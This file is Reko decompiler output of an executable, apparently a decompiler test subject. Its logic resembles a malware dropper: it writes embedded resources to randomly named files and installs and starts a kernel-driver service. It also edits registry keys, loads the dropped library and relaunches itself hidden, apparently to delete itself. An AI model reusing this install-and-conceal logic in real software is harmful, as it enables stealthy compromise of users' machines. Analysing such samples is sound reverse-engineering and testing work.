// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 08001340: void fn08001340(Stack (ptr32 byte) dwArg04, Stack Eq_3 dwArg08, Stack Eq_4 dwArg0C)
void fn08001340(byte * dwArg04, Eq_3 dwArg08, Eq_4 dwArg0C)
{
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = (byte) *dwArg08;
		dwArg04 = dwArg04 + 0x01;
		dwArg08 = (word32) dwArg08 + 0x01;
	}
}

// 08001390: void fn08001390(Stack (ptr32 byte) dwArg04, Stack byte bArg08, Stack word32 dwArg0C)
void fn08001390(byte * dwArg04, byte bArg08, word32 dwArg0C)
{
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg04 = bArg08;
		dwArg04 = dwArg04 + 0x01;
	}
}

// 080013D0: Register Eq_3 fn080013D0(Stack Eq_4 dwArg04)
Eq_3 fn080013D0(Eq_4 dwArg04)
{
	if (globals->t8003008 == null)
		globals->t8003008 = GetProcessHeap();
	Eq_3 eax_21;
	if (globals->t8003008 != null)
		eax_21 = HeapAlloc(globals->t8003008, 0x00, dwArg04);
	else
		eax_21.u0 = 0x00;
	return eax_21;
}

// 08001420: void fn08001420(Stack Eq_3 dwArg04)
void fn08001420(Eq_3 dwArg04)
{
	if (globals->t8003008 != null)
		HeapFree(globals->t8003008, 0x00, dwArg04);
}

// 08001450: Register Eq_4 fn08001450(Register Eq_72 ebx, Register Eq_72 esi, Register Eq_72 edi, Register Eq_72 es, Register Eq_72 ds, Register out ptr32 edxOut)
Eq_4 fn08001450(Eq_72 ebx, Eq_72 esi, Eq_72 edi, Eq_72 es, Eq_72 ds, ptr32 & edxOut)
{
	ui32 eax_11 = globals->dw8003000 ^ fp - (CHAR *) 0x04;
	fn08001390(fp - 0x0170, 0x00, 0x40);
	lstrcpyA(fp - 636, GetCommandLineA());
	Eq_94 dwLoc0128_156 = fp - 636;
	Eq_4 edx_121;
	*edxOut = fp - 636;
	if ((int32) bLoc027C == 0x22)
	{
		(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(fp - 0x027E)[lstrlenA(fp - (CHAR *) 636)].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00] = (Eq_122) 0x00;
		*edxOut = fp - (CHAR *) 0x027B;
		dwLoc0128_156 = fp - (CHAR *) 0x027B;
	}
	Eq_4 dwLoc0280_120 = 0x0104;
	if (GetShortPathNameA(dwLoc0128_156, dwLoc0128_156, 0x0104) == 0x00)
		return fn08001FF8(0x00, eax_11 ^ fp - (CHAR *) 0x04, edx_121, ebx, fp - (CHAR *) 0x04, esi, edi, es, ds, dwLoc0280_120);
	lstrcpyA(fp - (CHAR *) 0x0114, 0x080010DC);
	lstrcatA(fp - (CHAR *) 0x0114, dwLoc0128_156);
	lstrcatA(fp - (CHAR *) 0x0114, 0x080010D4);
	GetEnvironmentVariableA(0x080010CC, dwLoc0128_156, 0x0104);
	dwLoc0280_120 = fp - (CHAR *) 292;
	*edxOut = fp - (CHAR *) 0x0174;
	if (CreateProcessA(dwLoc0128_156, fp - (CHAR *) 0x0114, null, null, 0x00, 0x08000000, 0x00, 0x00, fp - (CHAR *) 0x0174, fp - (CHAR *) 292) == 0x00)
		return fn08001FF8(0x00, eax_11 ^ fp - (CHAR *) 0x04, edx_121, ebx, fp - (CHAR *) 0x04, esi, edi, es, ds, dwLoc0280_120);
	ExitProcess(0x00);
}

// 080015A0: Register (ptr32 byte) fn080015A0(Stack Eq_215 dwArg04, Stack word32 dwArg08, Stack Eq_94 dwArg0C, Stack (ptr32 Eq_4) dwArg10)
byte * fn080015A0(HMODULE dwArg04, word32 dwArg08, Eq_94 dwArg0C, Eq_4 * dwArg10)
{
	byte * dwLoc10_40 = null;
	Eq_221 dwLoc08_10 = null;
	if (dwArg08 != 0x00)
		dwLoc08_10 = FindResourceA(dwArg04, (word32) wArg08, 0x080010E4);
	else if (dwArg0C != 0x00)
		dwLoc08_10 = FindResourceA(dwArg04, dwArg0C, 0x080010E4);
	Eq_236 eax_23 = LoadResource(dwArg04, dwLoc08_10);
	Eq_4 eax_32 = SizeofResource(dwArg04, dwLoc08_10);
	if (eax_23 != null)
	{
		Eq_3 eax_54 = LockResource(eax_23);
		if (eax_54 != 0x00)
		{
			*dwArg10 = (union Eq_4 *) eax_32;
			byte * eax_77 = fn080013D0(eax_32);
			fn08001340(eax_77, eax_54, eax_32);
			dwLoc10_40 = eax_77;
		}
		FreeResource(eax_23);
	}
	return dwLoc10_40;
}

// 08001670: Register word32 fn08001670(Stack Eq_94 dwArg04, Stack Eq_3 dwArg08, Stack Eq_4 dwArg0C)
word32 fn08001670(Eq_94 dwArg04, Eq_3 dwArg08, Eq_4 dwArg0C)
{
	word32 eax_35;
	if (dwArg08 != 0x00 && dwArg0C != 0x00)
	{
		Eq_34 eax_73 = CreateFileA(dwArg04, 0x40000000, 0x00, null, 0x02, 0x80, null);
		if (eax_73 != (void *) ~0x00)
		{
			WriteFile(eax_73, dwArg08, dwArg0C, fp + 0x0C, null);
			CloseHandle(eax_73);
			eax_35 = 0x01;
			return eax_35;
		}
	}
	eax_35 = 0x00;
	return eax_35;
}

// 080016E0: Register word16 fn080016E0()
word16 fn080016E0()
{
	QueryPerformanceCounter(fp - 0x0C);
	return (word16) dwLoc0C;
}

// 08001700: void fn08001700(Stack Eq_94 dwArg04, Stack Eq_94 dwArg08)
void fn08001700(Eq_94 dwArg04, Eq_94 dwArg08)
{
	*dwArg08 = (byte) ((int32) ((int64) (word32) fn080016E0() % 0x19) + 0x41);
	*((word32) dwArg08 + 0x01) = (byte) ((int32) ((int64) (word32) fn080016E0() % 0x19) + 0x61);
	*((word32) dwArg08 + 0x02) = (byte) ((int32) ((int64) (word32) fn080016E0() % 0x19) + 0x61);
	*((word32) dwArg08 + 0x03) = (byte) ((int32) ((int64) (word32) fn080016E0() % 0x09) + 0x30);
	*((word32) dwArg08 + 0x04) = (byte) ((int32) ((int64) (word32) fn080016E0() % 0x09) + 0x30);
	*((word32) dwArg08 + 0x05) = 0x00;
	GetEnvironmentVariableA(0x08001104, dwArg04, 0x0104);
	lstrcatA(dwArg04, 0x080010F0);
	lstrcatA(dwArg04, dwArg08);
	lstrcatA(dwArg04, 0x080010E8);
}

// 080017E0: void fn080017E0(Stack Eq_94 dwArg04)
void fn080017E0(Eq_94 dwArg04)
{
	GetEnvironmentVariableA(0x08001104, dwArg04, 0x0104);
	lstrcatA(dwArg04, 0x08001110);
}

// 08001820: void fn08001820(Stack Eq_94 dwArg04, Stack Eq_94 dwArg08)
void fn08001820(Eq_94 dwArg04, Eq_94 dwArg08)
{
	Eq_424 eax_16 = OpenSCManagerA(0x00, 0x00, 0x000F003F);
	Eq_424 eax_28 = OpenServiceA(eax_16, dwArg08, 0x000F01FF);
	Eq_424 dwLoc08_147 = eax_28;
	if (eax_28 == null)
		dwLoc08_147 = CreateServiceA(eax_16, dwArg08, 0x00, 0x000F01FF, 0x01, 0x03, 0x00, dwArg04, 0x00, null, 0x00, 0x00, 0x00);
	if (dwLoc08_147 == null || StartServiceA(dwLoc08_147, 0x00, null) == 0x00)
		GetLastError() != 0x0420;
	if (dwLoc08_147 != null)
		CloseServiceHandle(dwLoc08_147);
}

// 080018F0: void fn080018F0(Register Eq_72 ebx, Register Eq_72 esi, Register Eq_72 edi, Register Eq_72 es, Register Eq_72 ds, Stack Eq_94 dwArg04)
void fn080018F0(Eq_72 ebx, Eq_72 esi, Eq_72 edi, Eq_72 es, Eq_72 ds, Eq_94 dwArg04)
{
	ui32 eax_11 = globals->dw8003000 ^ fp - 0x04;
	lstrcpyA(fp - 0x020C, 0x08001164);
	lstrcatA(fp - 0x020C, dwArg04);
	lstrcatA(fp - 0x020C, 0x080010E8);
	lstrcpyA(fp - 0x010C, 0x08001130);
	lstrcatA(fp - 0x010C, dwArg04);
	lstrcatA(fp - 0x010C, 0x080010E8);
	RegCreateKeyA(0x80000002, fp - 0x020C, fp - 0x0210);
	RegSetValueA(dwLoc0210, 0x00, 0x01, 0x08001128, 0x08);
	RegCloseKey(dwLoc0210);
	RegCreateKeyA(0x80000002, fp - 0x010C, fp - 0x0210);
	RegSetValueA(dwLoc0210, 0x00, 0x01, 0x08001128, 0x08);
	fn08001FF8(RegCloseKey(dwLoc0210), eax_11 ^ fp - 0x04, dwLoc0210, ebx, fp - 0x04, esi, edi, es, ds, dwLoc0210);
}

// 08001A00: void fn08001A00(Register Eq_72 ebx, Register Eq_72 esi, Register Eq_72 edi, Register Eq_72 es, Register Eq_72 ds, Stack Eq_94 dwArg04, Stack Eq_94 dwArg08)
void fn08001A00(Eq_72 ebx, Eq_72 esi, Eq_72 edi, Eq_72 es, Eq_72 ds, Eq_94 dwArg04, Eq_94 dwArg08)
{
	ui32 eax_11 = globals->dw8003000 ^ fp - 0x04;
	lstrcpyA(fp - 0x020C, dwArg08);
	lstrcatA(fp - 0x020C, dwArg04);
	RegCreateKeyA(0x80000002, fp - 0x020C, fp - 0x0210);
	RegSetValueExA(dwLoc0210, 134222292, 0x00, 0x04, fp - 0x0318, 0x04);
	RegSetValueExA(dwLoc0210, 0x080011CC, 0x00, 0x04, fp - 0x08, 0x04);
	lstrcpyA(fp - 788, 0x080011B8);
	lstrcatA(fp - 788, dwArg04);
	lstrcatA(fp - 788, 0x080010E8);
	RegSetValueExA(dwLoc0210, 134222252, 0x00, 0x01, fp - 788, lstrlenA(fp - 788) + 0x01);
	fn08001390(fp - 0x0101, 0x00, 0xF5);
	RegSetValueExA(dwLoc0210, 134222232, 0x00, 0x01, fp - 0x010C, lstrlenA(fp - 0x010C) + 0x01);
	fn08001FF8(RegCloseKey(dwLoc0210), eax_11 ^ fp - 0x04, fp - 0x010C, ebx, fp - 0x04, esi, edi, es, ds, dwLoc0210);
}

// 08001BA0: void fn08001BA0()
void fn08001BA0()
{
	RegCreateKeyA(0x80000002, 0x08001210, fp - 0x0C);
	RegSetValueExA(dwLoc0C, 0x08001204, 0x00, 0x01, &globals->t800126C, lstrlenA(134222444) + 0x01);
	RegSetValueExA(dwLoc0C, 0x080011F8, 0x00, 0x01, &globals->t8001258, lstrlenA(134222424) + 0x01);
	RegSetValueExA(dwLoc0C, 0x080011EC, 0x00, 0x04, fp - 0x08, 0x04);
	RegSetValueExA(dwLoc0C, 0x080011DC, 0x00, 0x04, fp - 0x18, 0x04);
	RegCloseKey(dwLoc0C);
}

// 08001C70: Register Eq_34 fn08001C70()
HANDLE fn08001C70()
{
	return CreateFileA(0x08001278, 0xC0000000, 0x00, null, 0x02, 0x80, null);
}

// 08001CA0: Register Eq_4 Win32CrtStartup()
Eq_4 Win32CrtStartup()
{
	word32 dwLoc03FC_27;
	ui32 eax_11 = globals->dw8003000 ^ fp - 0x04;
	Eq_215 eax_16 = GetModuleHandleA(0x00);
	GetVersionExA(fp - 0x03CC);
	Eq_72 edi_164 = edi;
	Eq_72 ebp_165 = fp - 0x04;
	if (dwLoc03C8 == 0x05 && dwLoc03C4 == 0x00)
		dwLoc03FC_27 = 0x01;
	else
		dwLoc03FC_27 = 0x00;
	word32 dwLoc0400_32;
	if (dwLoc03C8 == 0x05 && dwLoc03C4 == 0x01)
		dwLoc0400_32 = 0x01;
	else
		dwLoc0400_32 = 0x00;
	word32 dwLoc0404_351;
	if (dwLoc03C8 == 0x05 && dwLoc03C4 == 0x02)
		dwLoc0404_351 = 0x01;
	else
		dwLoc0404_351 = 0x00;
	fn080017E0(fp - 0x011C);
	fn08001700(fp - 0x0334, fp - 0x0224);
	if (dwLoc03FC_27 != 0x00 || (dwLoc0400_32 != 0x00 || dwLoc0404_351 != 0x00))
	{
		Eq_3 eax_96 = fn080015A0(eax_16, 101, 0x00, fp - 0x03D4);
		Eq_3 eax_109 = fn080015A0(eax_16, 0x66, 0x00, fp - 0x03D8);
		word32 dwLoc03DC_112 = 0x00;
		Eq_34 eax_113 = fn08001C70();
		if (eax_113 != (void *) ~0x00)
		{
			DeviceIoControl(eax_113, 0x9D082440, eax_96, dwLoc03D4, 0x00, 0x00, fp - 1000, null);
			DeviceIoControl(eax_113, 0x9D082444, eax_109, dwLoc03D8, 0x00, 0x00, fp - 1000, null);
			CloseHandle(eax_113);
		}
		else
		{
			if (fn08001670(fp - 0x011C, eax_109, dwLoc03D8) == 0x01)
				dwLoc03DC_112 = 0x01;
			fn08001670(fp - 0x0334, eax_96, dwLoc03D4);
			fn08001BA0();
			fn080018F0(ebx, esi, edi, es, ds, fp - 0x0224);
			fn08001820(fp - 0x0334, fp - 0x0224);
			Sleep(500);
			fn08001A00(ebx, esi, edi, es, ds, fp - 0x0224, 0x080012A8);
			fn08001A00(ebx, esi, edi, es, ds, fp - 0x0224, 0x08001288);
			Sleep(500);
			Eq_34 eax_283 = fn08001C70();
			if (eax_283 != (void *) ~0x00)
			{
				DeviceIoControl(eax_283, 0x9D082444, eax_109, dwLoc03D8, 0x00, 0x00, fp - 0x03F0, null);
				DeviceIoControl(eax_283, 2634556544, 0x00, 0x00, 0x00, 0x00, fp - 0x03F0, null);
				CloseHandle(eax_283);
			}
		}
		fn08001420(eax_96);
		fn08001420(eax_109);
		if (dwLoc03DC_112 != 0x00)
		{
			Eq_215 eax_146 = LoadLibraryA(fp - 0x011C);
			if (eax_146 != null)
			{
				Eq_903 eax_156 = GetProcAddress(eax_146, 0x08001284);
				if (eax_156 != null)
				{
					eax_156();
					ds.u0 = <invalid>;
					es.u0 = <invalid>;
					esi.u0 = <invalid>;
					ebx.u0 = <invalid>;
					ebp_165.u0 = <invalid>;
					edi_164.u0 = <invalid>;
				}
			}
		}
	}
	Eq_4 edx_76;
	Eq_70 eax_77 = fn08001450(ebx, esi, edi_164, es, ds, out edx_76);
	return fn08001FF8(eax_77, eax_11 ^ fp - 0x04, edx_76, ebx, ebp_165, esi, edi_164, es, ds, ebp);
}

// 08001FF8: Register Eq_70 fn08001FF8(Register Eq_70 eax, Register ui32 ecx, Register Eq_4 edx, Register Eq_72 ebx, Register Eq_72 ebp, Register Eq_72 esi, Register Eq_72 edi, Register Eq_72 es, Register Eq_72 ds, Stack Eq_4 dwArg00)
Eq_70 fn08001FF8(Eq_70 eax, ui32 ecx, Eq_4 edx, Eq_72 ebx, Eq_72 ebp, Eq_72 esi, Eq_72 edi, Eq_72 es, Eq_72 ds, Eq_4 dwArg00)
{
	if (ecx == globals->dw8003000)
		return eax;
	globals->t8003110 = eax;
	globals->dw800310C = ecx;
	globals->t8003108 = edx;
	globals->t8003104 = ebx;
	globals->t8003100 = esi;
	globals->t80030FC = edi;
	globals->ptr8003128 = ss;
	globals->ptr800311C = cs;
	globals->t80030F8 = ds;
	globals->t80030F4 = es;
	globals->ptr80030F0 = fs;
	globals->ptr80030EC = gs;
	globals->t8003120 = cond(fp - 0x0324);
	globals->ptr8003124 = fp + 0x04;
	globals->t8003118 = dwArg00;
	globals->dw8003060 = 0x00010001;
	globals->t800301C = dwArg00;
	globals->t8003114 = ebp;
	globals->dw8003010 = 0xC0000409;
	globals->dw8003014 = 0x01;
	SetUnhandledExceptionFilter(null);
	UnhandledExceptionFilter(&globals->t80012C8);
	return TerminateProcess(GetCurrentProcess(), 0xC0000409);
}

